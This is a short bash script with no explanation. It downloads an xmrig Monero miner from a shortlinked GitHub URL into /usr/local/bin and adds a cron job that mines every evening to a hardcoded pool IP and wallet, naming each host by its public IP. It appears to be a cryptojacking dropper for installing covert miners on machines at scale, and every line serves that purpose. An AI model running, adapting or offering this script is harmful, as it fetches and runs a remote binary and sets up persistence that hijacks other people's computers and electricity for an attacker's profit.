#!/bin/bash
export DIRECTORY="/usr/local/bin"
export DOWNLOAD_URL="https://slink.ltd/https://raw.githubusercontent.com/lin2elysia/load/main/xmrig"
export POOL=38.47.101.33:443
export WALLET=43p8AgGKbhH198j4aTvwMb42PwT6Mc1qzYm7Bxg4y4DTESJtGAvzgGePtwqudFmz7RCi29fwkuG4ZLgxmmQzN8joADCEv9S
export LOCAL_IP=$(curl 4.ipw.cn)-Auto

# Check if xmrig file exists
if [ ! -f "$DIRECTORY/xmrig" ]; then
    # Download xmrig
    curl -s -o "$DIRECTORY/xmrig" "$DOWNLOAD_URL"
    if [ $? -ne 0 ]; then
        echo "Failed to download xmrig."
        exit 1
    fi
    # Set permissions
    chmod +x "$DIRECTORY/xmrig"
fi

# Schedule cron job
(crontab -l ; echo "0 16-22 * * * /usr/local/bin/xmrig --url=$POOL --donate-level=0 --user=$WALLET --pass=$LOCAL_IP -k --coin monero --tls") | crontab -
